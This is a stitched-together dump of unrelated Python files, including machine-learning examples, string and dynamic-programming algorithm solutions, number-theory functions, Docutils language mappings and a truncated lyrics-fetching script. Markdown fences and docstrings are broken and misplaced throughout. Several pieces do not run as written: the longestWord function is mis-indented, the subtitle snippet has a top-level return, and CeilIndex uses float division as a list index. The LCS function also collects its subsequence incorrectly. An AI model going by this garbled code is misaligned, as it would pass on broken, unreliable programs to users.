https://medium.com/@martinpella/logistic-regression-from-scratch-in-python-124c5636b8ac```


```py
import numpy as np
from matplotlib import pyplot as plt
from sklearn import datasets

# get_ipython().run_line_magic('matplotlib', 'inline')


# In[67]:

# sigmoid function or logistic function is used as a hypothesis function in
# classification problems


def sigmoid_function(z):
    return 1 / (1 + np.exp(-z))


def cost_function(h, y):
    return (-y * np.log(h) - (1 - y) * np.log(1 - h)).mean()


def log_likelihood(X, Y, weights):
    scores = np.dot(X, weights)
    return np.sum(Y * scores - np.log(1 + np.exp(scores)))


# here alpha is the learning rate, X is the feature matrix,y is the target matrix
def logistic_reg(alpha, X, y, max_iterations=70000):
    theta = np.zeros(X.shape[1])

    for iterations in range(max_iterations):
        z = np.dot(X, theta)
        h = sigmoid_function(z)
        gradient = np.dot(X.T, h - y) / y.size
        theta = theta - alpha * gradient  # updating the weights
        z = np.dot(X, theta)
        h = sigmoid_function(z)
        J = cost_function(h, y)
        if iterations % 100 == 0:
            print(f"loss: {J} \t")  # printing the loss after every 100 iterations
    return theta


# In[68]:

if __name__ == "__main__":
    iris = datasets.load_iris()
    X = iris.data[:, :2]
    y = (iris.target != 0) * 1

    alpha = 0.1
    theta = logistic_reg(alpha, X, y, max_iterations=70000)
    print("theta: ", theta)  # printing the theta i.e our weights vector

    def predict_prob(X):
        return sigmoid_function(
            np.dot(X, theta)
        )  # predicting the value of probability from the logistic regression algorithm

    plt.figure(figsize=(10, 6))
    plt.scatter(X[y == 0][:, 0], X[y == 0][:, 1], color="b", label="0")
    plt.scatter(X[y == 1][:, 0], X[y == 1][:, 1], color="r", label="1")
    (x1_min, x1_max) = (X[:, 0].min(), X[:, 0].max())
    (x2_min, x2_max) = (X[:, 1].min(), X[:, 1].max())
    (xx1, xx2) = np.meshgrid(np.linspace(x1_min, x1_max), np.linspace(x2_min, x2_max))
    grid = np.c_[xx1.ravel(), xx2.ravel()]
    probs = predict_prob(grid).reshape(xx1.shape)
    plt.contour(xx1, xx2, probs, [0.5], linewidths=1, colors="black")

    plt.legend()
    plt.show()

from ._version import __version__

ASCII_ART = rf"""
                 _                 _
                (_) ___  ___  _ __| |_
                | |/ _/ / _ \/ '__  _/
                | |\__ \/\_\/| |  | |_
                |_|\___/\___/\_/   \_/

      isort your imports, so you don't have to.

                    VERSION {__version__}```


```py

__doc__ = f"""
```python
{ASCII_ART}
````

```py

```

`pyTornado handlers for logging out of the notebook.`

````py

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from ..base.handlers import IPythonHandler


class LogoutHandler(IPythonHandler):

    def get(self):
        self.clear_login_cookie()
        if self.login_available:
            message = {'info': 'Successfully logged out.'}
        else:
            message = {'warning': 'Cannot log out.  Notebook authentication '
                       'is disabled.'}
        self.write(self.render_template('logout.html',
                    message=message))


default_handlers = [(r"/logout", LogoutHandler)]```


```py
Longest Common Prefix

Write a function to find the longest common prefix string amongst an array of strings.
If there is no common prefix, return an empty string ''.

Input: ['flower', 'flow', 'flight']
Output: 'fl'

Input: ['dog', 'racecar', 'car']
Output: ''

Input: ['aa', 'a']
Output: 'a'

=========================================
Many solutions for this problem exist (Divide and Conquer, Trie, etc) but this is the simplest and the fastest one.
Use the first string as LCP and iterate the rest in each step compare it with another one.
    Time Complexity:    O(N*A)  , N = number of strings, A = average chars, or simplest notation O(S) = total number of chars
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def longest_common_prefix(strs):
    n = len(strs)
    if n == 0:
        return ""

    lcp = strs[0]
    # instead of string manipulations, manipulate with the last common index
    lcp_idx = len(lcp)

    for i in range(1, n):
        lcp_idx = min(lcp_idx, len(strs[i]))

        for j in range(lcp_idx):
            if lcp[j] != strs[i][j]:
                lcp_idx = j
                break

    return lcp[:lcp_idx]
    """
    # if you like string manipulations, you can use this code
    # i don't like string manipulations in Python because they're immutable
    lcp = strs[0]
    for i in range(1, n):
        lcp = lcp[:len(strs[i])]
        for j in range(len(lcp)):
            if lcp[j] != strs[i][j]:
                lcp = lcp[:j]
                break
    return lcp
    """


###########
# Testing #
###########

# Test 1
# Correct result => 'fl'
print(longest_common_prefix(["flower", "flow", "flight"]))

# Test 2
# Correct result => ''
print(longest_common_prefix(["dog", "racecar", "car"]))

# Test 3
# Correct result => 'a'
print(longest_common_prefix(["aa", "a"]))
````

````py
LCS Problem Statement: Given two sequences, find the length of longest subsequence present in both of them.
A subsequence is a sequence that appears in the same relative order, but not necessarily continious.
Example:"abc", "abg" are subsequences of "abcdefgh".```


```py
from __future__ import print_function

try:
    xrange          # Python 2
except NameError:
    xrange = range  # Python 3

def lcs_dp(x, y):
    # find the length of strings
    m = len(x)
    n = len(y)

    # declaring the array for storing the dp values
    L = [[None] * (n + 1) for i in xrange(m + 1)]
    seq = []

    for i in range(m + 1):
        for j in range(n + 1):
            if i == 0 or j == 0:
                L[i][j] = 0
            elif x[i - 1] == y[ j - 1]:
                L[i][j] = L[i - 1][j - 1] + 1
                seq.append(x[i -1])
            else:
                L[i][j] = max(L[i - 1][j], L[i][j - 1])
    # L[m][n] contains the length of LCS of X[0..n-1] & Y[0..m-1]
    return L[m][n], seq

if __name__=='__main__':
    x = 'AGGTAB'
    y = 'GXTXAYB'
    print(lcs_dp(x, y))
````

````py
Longest Common Substring

Given two strings X and Y, find the of longest common substring.

Input: 'GeeksforGeeks', 'GeeksQuiz'
Output: 'Geeks'

=========================================
Dynamic Programming Solution.
    Time Complexity:    O(N * M)
    Space Complexity:   O(M)
* For this problem exists a faster solution, using Suffix tree, Time Complexity O(N + M).```


```py


############
# Solution #
############


def longest_common_substring(str1, str2):
    n, m = len(str1), len(str2)
    # instead of creating a whole dp table, use only 2 rows (current and previous row)
    curr = [0 for j in range(m + 1)]
    prev = []
    max_length = 0
    max_idx = 0

    for i in range(1, n + 1):
        # save the previous row and create the current row
        prev = curr
        curr = [0 for j in range(m + 1)]

        for j in range(1, m + 1):
            if str1[i - 1] == str2[j - 1]:
                # search only for matching chars
                curr[j] = prev[j - 1] + 1

                if curr[j] > max_length:
                    # save the last matching index of the first string
                    max_length = curr[j]
                    max_idx = i

    return str1[max_idx - max_length : max_idx]


###########
# Testing #
###########

# Test 1
# Correct result => BABC
print(longest_common_substring("ABABC", "BABCA"))

# Test 2
# Correct result => Geeks
print(longest_common_substring("GeeksforGeeks", "GeeksQuiz"))

# Test 3
# Correct result => abcd
print(longest_common_substring("abcdxyz", "xyzabcd"))

# Test 4
# Correct result => abcdez
print(longest_common_substring("zxabcdezy", "yzabcdezx"))

def longestDigitsPrefix(inputString):
    for i in range(len(inputString)):
        if not inputString[i].isdigit():
            return inputString[:i]
    return inputString
````

````py
Longest Increasing Subarray

Find the longest increasing subarray (subarray is when all elements are neighboring in the original array).

Input: [10, 1, 3, 8, 2, 0, 5, 7, 12, 3]
Output: 4

=========================================
Only in one iteration, check if the current element is bigger than the previous and increase the counter if true.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def longest_increasing_subarray(arr):
    n = len(arr)
    longest = 0
    current = 1
    i = 1

    while i < n:
        if arr[i] < arr[i - 1]:
            longest = max(longest, current)
            current = 1
        else:
            current += 1

        i += 1

    # check again for max, maybe the last element is a part of the longest subarray
    return max(longest, current)


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(longest_increasing_subarray([10, 1, 3, 8, 2, 0, 5, 7, 12, 3]))

'''
Author  : Mehdi ALAOUI

This is a pure Python implementation of Dynamic Programming solution to the longest increasing subsequence of a given sequence.

The problem is  :
Given an ARRAY, to find the longest and increasing sub ARRAY in that given ARRAY and return it.
Example: [10, 22, 9, 33, 21, 50, 41, 60, 80] as input will return [10, 22, 33, 41, 60, 80] as output
'''
from __future__ import print_function

def longestSub(ARRAY):    #This function is recursive

 ARRAY_LENGTH = len(ARRAY)
 if(ARRAY_LENGTH <= 1):   #If the array contains only one element, we return it (it's the stop condition of recursion)
  return ARRAY
        #Else
 PIVOT=ARRAY[0]
 isFound=False
 i=1
 LONGEST_SUB=[]
 while(not isFound and i<ARRAY_LENGTH):
  if (ARRAY[i] < PIVOT):
   isFound=True
   TEMPORARY_ARRAY = [ element for element in ARRAY[i:] if element >= ARRAY[i] ]
   TEMPORARY_ARRAY = longestSub(TEMPORARY_ARRAY)
   if ( len(TEMPORARY_ARRAY) > len(LONGEST_SUB) ):
    LONGEST_SUB = TEMPORARY_ARRAY
  else:
   i+=1

 TEMPORARY_ARRAY = [ element for element in ARRAY[1:] if element >= PIVOT ]
 TEMPORARY_ARRAY = [PIVOT] + longestSub(TEMPORARY_ARRAY)
 if ( len(TEMPORARY_ARRAY) > len(LONGEST_SUB) ):
  return TEMPORARY_ARRAY
 else:
  return LONGEST_SUB

#Some examples

print(longestSub([4,8,7,5,1,12,2,3,9]))
print(longestSub([9,8,7,6,5,7]))
from __future__ import print_function
#############################
# Author: Aravind Kashyap
# File: lis.py
# comments: This programme outputs the Longest Strictly Increasing Subsequence in O(NLogN)
#           Where N is the Number of elements in the list
#############################
def CeilIndex(v,l,r,key):
 while r-l > 1:
  m = (l + r)/2
  if v[m] >= key:
   r = m
  else:
   l = m

 return r


def LongestIncreasingSubsequenceLength(v):
 if(len(v) == 0):
  return 0

 tail = [0]*len(v)
 length = 1

 tail[0] = v[0]

 for i in range(1,len(v)):
  if v[i] < tail[0]:
   tail[0] = v[i]
  elif v[i] > tail[length-1]:
   tail[length] = v[i]
   length += 1
  else:
   tail[CeilIndex(tail,-1,length-1,v[i])] = v[i]

 return length


v = [2, 5, 3, 7, 11, 8, 10, 13, 6]
print(LongestIncreasingSubsequenceLength(v))
````

````py
Author  : Anubhav Sharma
This is a pure Python implementation of Dynamic Programming solution to the longest
palindrome substring of a given string.
I use Manacher Algorithm which is amazing algorithm and find solution in linear time complexity.
The problem is  :
Given a string, to find the longest palindrome sub-string in that given string and
return it.
Example: aabbabbaababa as input will return
         aabbabbaa as output```


```py


def manacher_algo_lps(s, n):
    """
    PARAMETER
    --------------
    s = string
    n = string_len (int)
    manacher Algorithm is the fastest technique to find the longest palindrome substring in any given string.
    RETURN
    ---------------
    Longest Palindrome String(String)
    """
    # variables to use
    p = [0] * n
    c = 0
    r = 0
    maxlen = 0

    # Main Algorithm
    for i in range(n):
        mirror = 2 * c - i  # Finding the Mirror(i.e. Pivort to break) of the string
        if i < r:
            p[i] = (r - i) if (r - i) < p[mirror] else p[mirror]
        a = i + (1 + p[i])
        b = i - (1 + p[i])

        # Attempt to expand palindrome centered at currentRightPosition i
        # Here for odd positions, we compare characters and
        # if match then increment LPS Length by ONE
        # If even position, we just increment LPS by ONE without
        # any character comparison
        while a < n and b >= 0 and s[a] == s[b]:
            p[i] += 1
            a += 1
            b -= 1
        if (i + p[i]) > r:
            c = i
            r = i + p[i]
            if p[i] > maxlen:  # Track maxLPSLength
                maxlen = p[i]
    i = p.index(maxlen)
    return s[i - maxlen : maxlen + i][1::2]


def longest_palindrome(s: str) -> str:
    s = "#".join(s)
    s = "#" + s + "#"

    # Calling Manacher Algorithm
    return manacher_algo_lps(s, len(s))


def main():

    # Input to enter
    input_string = "abbbacdcaacdca"

    # Calling the longest palindrome algorithm
    s = longest_palindrome(input_string)
    print("LPS Using Manacher Algorithm {}".format(s))


# Calling Main Function
if __name__ == "__main__":

    main()
````

```py
Given string s, find the longest palindromic substring.

Example1:

* input: "dasdasdasdasdasdadsa"
* output: "asdadsa"

Example2:

* input: "acdbbdaa"
* output: "dbbd"

Manacher's algorithm
```

```py


def longest_palindrome(s):
    if len(s) < 2:
        return s

    n_str = "#" + "#".join(s) + "#"
    p = [0] * len(n_str)
    mx, loc = 0, 0
    index, maxlen = 0, 0
    for i in range(len(n_str)):
        if i < mx and 2 * loc - i < len(n_str):
            p[i] = min(mx - i, p[2 * loc - i])
        else:
            p[i] = 1

        while (
            p[i] + i < len(n_str)
            and i - p[i] >= 0
            and n_str[i - p[i]] == n_str[i + p[i]]
        ):
            p[i] += 1

        if i + p[i] > mx:
            mx = i + p[i]
            loc = i

        if p[i] > maxlen:
            index = i
            maxlen = p[i]
    s = n_str[index - p[index] + 1 : index + p[index]]
    return s.replace("#", "")

'''
Auther  : Yvonne

This is a pure Python implementation of Dynamic Programming solution to the longest_sub_array problem.

The problem is  :
Given an array, to find the longest and continuous sub array and get the max sum of the sub array in the given array.
'''
from __future__ import print_function


class SubArray:

    def __init__(self, arr):
        # we need a list not a string, so do something to change the type
        self.array = arr.split(',')
        print(("the input array is:", self.array))

    def solve_sub_array(self):
        rear = [int(self.array[0])]*len(self.array)
        sum_value = [int(self.array[0])]*len(self.array)
        for i in range(1, len(self.array)):
            sum_value[i] = max(int(self.array[i]) + sum_value[i-1], int(self.array[i]))
            rear[i] = max(sum_value[i], rear[i-1])
        return rear[len(self.array)-1]


if __name__ == '__main__':
    whole_array = input("please input some numbers:")
    array = SubArray(whole_array)
    re = array.solve_sub_array()
    print(("the results is:", re))

```

````py
Longest Substring With k Distinct Characters

Given an integer k and a string s, find the length of the longest substring that contains at most k distinct characters.

Input: s = 'abcba', k = 2
Output: 'bcb'

=========================================
Simple solution (like sliding window or queue, add to the end and remove from the front).
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def longest_substring_with_distinct_characters(s, k):
    letters = {}
    longest = 0
    length = 0

    for i in range(len(s)):
        if s[i] in letters:
            # if this letter exists then only increase the counter and length
            letters[s[i]] += 1
            length += 1
        else:
            # if this letter doesn't exist then remove all distinct letters from the front
            # so the count of distinct letters will be k-1
            while len(letters) == k:
                firstLetter = s[i - length]
                letters[firstLetter] -= 1  # decrease the counter
                if letters[firstLetter] == 0:
                    # remove this letter from the dictionary because
                    # in the susbtring there are no letters like this
                    del letters[firstLetter]
                length -= 1

            # add the new letter in the dictionary
            letters[s[i]] = 1
            length += 1

        # check if this length is the longest one
        longest = max(longest, length)

    return longest


###########
# Testing #
###########

# Test 1
# Correct result => 3
print(longest_substring_with_distinct_characters("abcba", 2))

# Test 2
# Correct result => 8
print(longest_substring_with_distinct_characters("abcbcbcbba", 2))
````

````py
Longest Substring Without Repeating Characters

Given a string, find the length of the longest substring without repeating characters.

Input: 'abcabcbb'
Output: 3
Output explanation: The answer is 'abc', with the length of 3.

Input: 'bbbbb'
Output: 1
Output explanation: The answer is 'b', with the length of 1.

=========================================
Simple string iteration, use hashset to save unique characters.
If the current character exists in the set then move the left index till the one
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def length_of_longest_substring(s):
    unique_chars = set()
    max_length = 0
    left = 0
    n = len(s)

    for i in range(n):
        while s[i] in unique_chars:
            # remove till the current char is unique
            unique_chars.remove(s[left])
            left += 1

        # in this moment you're sure that the current char is unique
        unique_chars.add(s[i])
        max_length = max(max_length, i - left + 1)

    return max_length


###########
# Testing #
###########

# Test 1
# Correct result => 3
print(length_of_longest_substring("abcabcbb"))

# Test 2
# Correct result => 1
print(length_of_longest_substring("bbbbb"))

def longestWord(text):
 """
 Return longest word in text string

 Time Complexity: O(n)
 Space Complexity: O(n)
 """
    word, words = '', []
    for i in range(len(text)):
        if text[i].isalpha():
            word += text[i]
            if i == len(text) - 1:
                words.append(word)
                word = ''
        elif word != '' and not text.isalpha():
            words.append(word)
            word = ''
    print(words)
    return max(words, key = len)
thm = int(0)
print("Enter the Number of Requests : ") #Number of I/O Requets
req = int(input())
print("Enter the Initial Head Position : ") #Initial position of Head
hp = int(input())
pos = hp
print("Enter the Seek Rate : ")
srate = int(input())
print("Enter the Requests : ")
arr = [ int(input()) for i in range(req)]
start = min(arr)
end = max(arr) #Start and End of Head Positions
print(hp, end='')
if((abs(hp-start))<(abs(hp-end))):
    for i in range(pos, start-1, -1): #Iterates the movement from initial to start of disk
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ",i, end='')
            arr.remove(i)
    thm+= abs(pos-start)
    pos = start
    print(" -> ", start, end='')
    for i in range(pos, end+1): #Scans back to end
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ", i, end='')
            arr.remove(i)
else:
    for i in range(pos, end+1): #Iterates the movement from initial to end of disk
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ",i, end='')
            arr.remove(i)
    thm+= abs(pos-end)
    pos = end
    print(" -> ", end, end='')
    for i in range(pos, start-1,-1): #Scans back to start
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ", i, end='')
            arr.remove(i)
stime = thm * srate
print("\nThe Total Head Movement is",thm)
print("The Seek Time is",stime)
import math

# Inverse Square Root is 1 over the square root of a number (1 / sqrt(n))

inv_sqrt = {}

def build_table(n):
    for i in range(1, n):
        global inv_sqrt

        inv_sqrt[i] = 1 / math.sqrt(i)

print("Building Table")
build_table(1000000)


print("Done Building")

print(inv_sqrt[30000])
print(inv_sqrt[30010])
print(inv_sqrt[32000])
print(inv_sqrt[30030])
print(inv_sqrt[30300])
print(inv_sqrt[30060])




iterable = range(5)  # range is the iterable
iterator = iter(iterable)  # extract iterator from iterable
while True:
    try:
        n = next(iterator)
        # Code inside "for" loop
        print(n, end=" ")
        n = 5  # Will be overridden by line 5 in next iteration
    except StopIteration:  # iterator signaled it's exhausted
        break
print()  # Code after "for" loop

def lower(word: str) -> str:
    """
    Will convert the entire string to lowercase letters

    >>> lower("wow")
    'wow'
    >>> lower("HellZo")
    'hellzo'
    >>> lower("WHAT")
    'what'
    >>> lower("wh[]32")
    'wh[]32'
    >>> lower("whAT")
    'what'
    """

    # converting to ascii value int value and checking to see if char is a capital
    # letter if it is a capital letter it is getting shift by 32 which makes it a lower
    # case letter
    return "".join(chr(ord(char) + 32) if "A" <= char <= "Z" else char for char in word)


if __name__ == "__main__":
    from doctest import testmod

    testmod()

l, s = eval(dir()[0])
r = []
c = 1

t = [[int(s[i : i + 2]) for i in [1, 4]] + [s[7:9]] for s in l]
t = [f"{x // 60:02d}:{x % 60:02d}:{y:02d},{z.ljust(3, str(0))}" for x, y, z in t] + [
    s + ",000"
]  # if I replace str(0) with '0', this increases to 359 characters wtf

for a, b in enumerate(l):
    r.extend([str(c), t[a] + " --> " + t[a + 1], b[11:], ""])
    c += 1
return r[:-1]

class LRUCache:
    def __init__(self, limit=10):
        pass

    """
  Retrieves the value associated with the given key. Also
  needs to move the key-value pair to the top of the order
  such that the pair is considered most-recently used.
  Returns the value associated with the key or None if the
  key-value pair doesn't exist in the cache.
  """

    def get(self, key):
        pass

    """
  Adds the given key-value pair to the cache. The newly-
  added pair should be considered the most-recently used
  entry in the cache. If the cache is already at max capacity
  before this entry is added, then the oldest entry in the
  cache needs to be removed to make room. Additionally, in the
  case that the key already exists in the cache, we simply
  want to overwrite the old value associated with the key with
  the newly-specified value.
  """

    def set(self, key, value):
        pass
````

````py
    Create a Long Short Term Memory (LSTM) network model
    An LSTM is a type of Recurrent Neural Network (RNN) as discussed at:
    * http://colah.github.io/posts/2015-08-Understanding-LSTMs
    * https://en.wikipedia.org/wiki/Long_short-term_memory```


```py
import numpy as np
import pandas as pd
from sklearn.preprocessing import MinMaxScaler
from tensorflow.keras.layers import LSTM, Dense
from tensorflow.keras.models import Sequential

if __name__ == "__main__":
    """
    First part of building a model is to get the data and prepare
    it for our model. You can use any dataset for stock prediction
    make sure you set the price column on line number 21.  Here we
    use a dataset which have the price on 3rd column.
    """
    df = pd.read_csv("sample_data.csv", header=None)
    len_data = df.shape[:1][0]
    # If you're using some other dataset input the target column
    actual_data = df.iloc[:, 1:2]
    actual_data = actual_data.values.reshape(len_data, 1)
    actual_data = MinMaxScaler().fit_transform(actual_data)
    look_back = 10
    forward_days = 5
    periods = 20
    division = len_data - periods * look_back
    train_data = actual_data[:division]
    test_data = actual_data[division - look_back :]
    train_x, train_y = [], []
    test_x, test_y = [], []

    for i in range(0, len(train_data) - forward_days - look_back + 1):
        train_x.append(train_data[i : i + look_back])
        train_y.append(train_data[i + look_back : i + look_back + forward_days])
    for i in range(0, len(test_data) - forward_days - look_back + 1):
        test_x.append(test_data[i : i + look_back])
        test_y.append(test_data[i + look_back : i + look_back + forward_days])
    x_train = np.array(train_x)
    x_test = np.array(test_x)
    y_train = np.array([list(i.ravel()) for i in train_y])
    y_test = np.array([list(i.ravel()) for i in test_y])

    model = Sequential()
    model.add(LSTM(128, input_shape=(look_back, 1), return_sequences=True))
    model.add(LSTM(64, input_shape=(128, 1)))
    model.add(Dense(forward_days))
    model.compile(loss="mean_squared_error", optimizer="adam")
    history = model.fit(
        x_train, y_train, epochs=150, verbose=1, shuffle=True, batch_size=4
    )
    pred = model.predict(x_test)

# -*- coding: utf-8 -*-
# $Id: lt.py 7911 2015-08-31 08:23:06Z milde $
# Author: Dalius Dobravolskas <dalius.do...@gmail.com>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Lithuanian language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      # fixed: language-dependent
      'author': 'Autorius',
      'authors': 'Autoriai',
      'organization': 'Organizacija',
      'address': 'Adresas',
      'contact': 'Kontaktas',
      'version': 'Versija',
      'revision': 'Revizija',
      'status': u'Būsena',
      'date': 'Data',
      'copyright': u'Autoriaus teisės',
      'dedication': 'Dedikacija',
      'abstract': 'Santrauka',
      'attention': u'Dėmesio!',
      'caution': 'Atsargiai!',
      'danger': '!PAVOJINGA!',
      'error': 'Klaida',
      'hint': u'Užuomina',
      'important': 'Svarbu',
      'note': 'Pastaba',
      'tip': 'Patarimas',
      'warning': u'Įspėjimas',
      'contents': 'Turinys'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      # language-dependent: fixed
      'autorius': 'author',
      'autoriai': 'authors',
      'organizacija': 'organization',
      'adresas': 'address',
      'kontaktas': 'contact',
      'versija': 'version',
      'revizija': 'revision',
      'būsena': 'status',
      'data': 'date',
      'autoriaus teisės': 'copyright',
      'dedikacija': 'dedication',
      'santrauka': 'abstract'}```


```pyLithuanian (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""
````

````pyLower-Upper (LU) Decomposition.

Reference:
- https://en.wikipedia.org/wiki/LU_decomposition```


```py
from typing import Tuple

import numpy as np


def lower_upper_decomposition(table: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:
    """Lower-Upper (LU) Decomposition

    Example:

    >>> matrix = np.array([[2, -2, 1], [0, 1, 2], [5, 3, 1]])
    >>> outcome = lower_upper_decomposition(matrix)
    >>> outcome[0]
    array([[1. , 0. , 0. ],
           [0. , 1. , 0. ],
           [2.5, 8. , 1. ]])
    >>> outcome[1]
    array([[  2. ,  -2. ,   1. ],
           [  0. ,   1. ,   2. ],
           [  0. ,   0. , -17.5]])

    >>> matrix = np.array([[2, -2, 1], [0, 1, 2]])
    >>> lower_upper_decomposition(matrix)
    Traceback (most recent call last):
    ...
    ValueError: 'table' has to be of square shaped array but got a 2x3 array:
    [[ 2 -2  1]
     [ 0  1  2]]
    """
    # Table that contains our data
    # Table has to be a square array so we need to check first
    rows, columns = np.shape(table)
    if rows != columns:
        raise ValueError(
            f"'table' has to be of square shaped array but got a {rows}x{columns} "
            + f"array:\n{table}"
        )
    lower = np.zeros((rows, columns))
    upper = np.zeros((rows, columns))
    for i in range(columns):
        for j in range(i):
            total = 0
            for k in range(j):
                total += lower[i][k] * upper[k][j]
            lower[i][j] = (table[i][j] - total) / upper[j][j]
        lower[i][i] = 1
        for j in range(i, columns):
            total = 0
            for k in range(i):
                total += lower[i][k] * upper[k][j]
            upper[i][j] = table[i][j] - total
    return lower, upper


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
        In mathematics, the Lucas–Lehmer test (LLT) is a primality test for Mersenne
        numbers.  https://en.wikipedia.org/wiki/Lucas%E2%80%93Lehmer_primality_test

        A Mersenne number is a number that is one less than a power of two.
        That is M_p = 2^p - 1
        https://en.wikipedia.org/wiki/Mersenne_prime

        The Lucas–Lehmer test is the primality test used by the
        Great Internet Mersenne Prime Search (GIMPS) to locate large primes.```


```py


# Primality test 2^p - 1
# Return true if 2^p - 1 is prime
def lucas_lehmer_test(p: int) -> bool:
    """
    >>> lucas_lehmer_test(p=7)
    True

    >>> lucas_lehmer_test(p=11)
    False

    # M_11 = 2^11 - 1 = 2047 = 23 * 89
    """

    if p < 2:
        raise ValueError("p should not be less than 2!")
    elif p == 2:
        return True

    s = 4
    M = (1 << p) - 1
    for i in range(p - 2):
        s = ((s * s) - 2) % M
    return s == 0


if __name__ == "__main__":
    print(lucas_lehmer_test(7))
    print(lucas_lehmer_test(11))
````

````py
https://en.wikipedia.org/wiki/Lucas_number```


```py


def recursive_lucas_number(n_th_number: int) -> int:
    """
    Returns the nth lucas number
    >>> recursive_lucas_number(1)
    1
    >>> recursive_lucas_number(20)
    15127
    >>> recursive_lucas_number(0)
    2
    >>> recursive_lucas_number(25)
    167761
    >>> recursive_lucas_number(-1.5)
    Traceback (most recent call last):
        ...
    TypeError: recursive_lucas_number accepts only integer arguments.
    """
    if not isinstance(n_th_number, int):
        raise TypeError("recursive_lucas_number accepts only integer arguments.")
    if n_th_number == 0:
        return 2
    if n_th_number == 1:
        return 1

    return recursive_lucas_number(n_th_number - 1) + recursive_lucas_number(
        n_th_number - 2
    )


def dynamic_lucas_number(n_th_number: int) -> int:
    """
    Returns the nth lucas number
    >>> dynamic_lucas_number(1)
    1
    >>> dynamic_lucas_number(20)
    15127
    >>> dynamic_lucas_number(0)
    2
    >>> dynamic_lucas_number(25)
    167761
    >>> dynamic_lucas_number(-1.5)
    Traceback (most recent call last):
        ...
    TypeError: dynamic_lucas_number accepts only integer arguments.
    """
    if not isinstance(n_th_number, int):
        raise TypeError("dynamic_lucas_number accepts only integer arguments.")
    a, b = 2, 1
    for i in range(n_th_number):
        a, b = b, a + b
    return a


if __name__ == "__main__":
    from doctest import testmod

    testmod()
    n = int(input("Enter the number of terms in lucas series:\n").strip())
    print("Using recursive function to calculate lucas series:")
    print(" ".join(str(recursive_lucas_number(i)) for i in range(n)))
    print("\nUsing dynamic function to calculate lucas series:")
    print(" ".join(str(dynamic_lucas_number(i)) for i in range(n)))
````

```py Luhn Algorithm """
from typing import List


def is_luhn(string: str) -> bool:
    """
    Perform Luhn validation on input string
    Algorithm:
    * Double every other digit starting from 2nd last digit.
    * Subtract 9 if number is greater than 9.
    * Sum the numbers
    *
    >>> test_cases = [79927398710, 79927398711, 79927398712, 79927398713,
    ...     79927398714, 79927398715, 79927398716, 79927398717, 79927398718,
    ...     79927398719]
    >>> test_cases = list(map(str, test_cases))
    >>> list(map(is_luhn, test_cases))
    [False, False, False, True, False, False, False, False, False, False]
    """
    check_digit: int
    _vector: List[str] = list(string)
    __vector, check_digit = _vector[:-1], int(_vector[-1])
    vector: List[int] = [*map(int, __vector)]

    vector.reverse()
    for idx, i in enumerate(vector):

        if idx & 1 == 0:
            doubled: int = vector[idx] * 2
            if doubled > 9:
                doubled -= 9

            check_digit += doubled
        else:
            check_digit += i

    if (check_digit) % 10 == 0:
        return True
    return False


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    assert is_luhn("79927398713")

# -*- coding: utf-8 -*-
# $Id: lv.py 7975 2016-10-20 20:00:19Z milde $
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
```

````py
Latvian-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      # fixed: language-dependent
      'author': 'Autors',
      'authors': 'Autori',
      'organization': 'Organizācija',
      'address': 'Adrese',
      'contact': 'Kontakti',
      'version': 'Versija',
      'revision': 'Revīzija',
      'status': 'Statuss',
      'date': 'Datums',
      'copyright': 'Copyright',
      'dedication': 'Veltījums',
      'abstract': 'Atreferējums',
      'attention': 'Uzmanību!',
      'caution': 'Piesardzību!',
      'danger': '!BĪSTAMI!',
      'error': 'Kļūda',
      'hint': 'Ieteikums',
      'important': 'Svarīgi',
      'note': 'Piezīme',
      'tip': 'Padoms',
      'warning': 'Brīdinājums',
      'contents': 'Saturs'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      # language-dependent: fixed
      'autors': 'author',
      'autori': 'authors',
      'organizācija': 'organization',
      'adrese': 'address',
      'kontakti': 'contact',
      'versija': 'version',
      'revīzija': 'revision',
      'statuss': 'status',
      'datums': 'date',
      'copyright': 'copyright',
      'veltījums': 'dedication',
      'atreferējums': 'abstract'}```


```pyEnglish (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

# !/bin/python3
# lyrics.py
# Author: Advik Singhania
# Date: 12th February, 2021
'''Song-Lyrics-Fetcher'''
'''A Python3 script to fetch the lyrics of a song using Genius API and lyricsgenius module.'''

# Importing the required modules:
try:
    import os
    import lyricsgenius as lg
except ModuleNotFoundError:  # Handle the error if the module is not found
    print(
        'Module not found. Run "python3 -m pip install lyricsgenius" to install it.'
    )

# Creating an instance of the Genius API and giving it the required API Token
# Replace Insert_Client_API_Token_Here with your API Token
genius = lg.Genius('Insert_Client_API_Token_Here',
                   skip_non_songs=True,
                   excluded_terms=["(Remix)", "(Live)"],
                   remove_section_headers=True)

# Taking the title name of the song and the artist name as the input from the user:
title = input('Enter the title of the song   : ')
artist = input('Enter name of the artist/band : ')

print()  # Empty line

# Creating a file to store the lyrics:
# filename for the file is the name of song
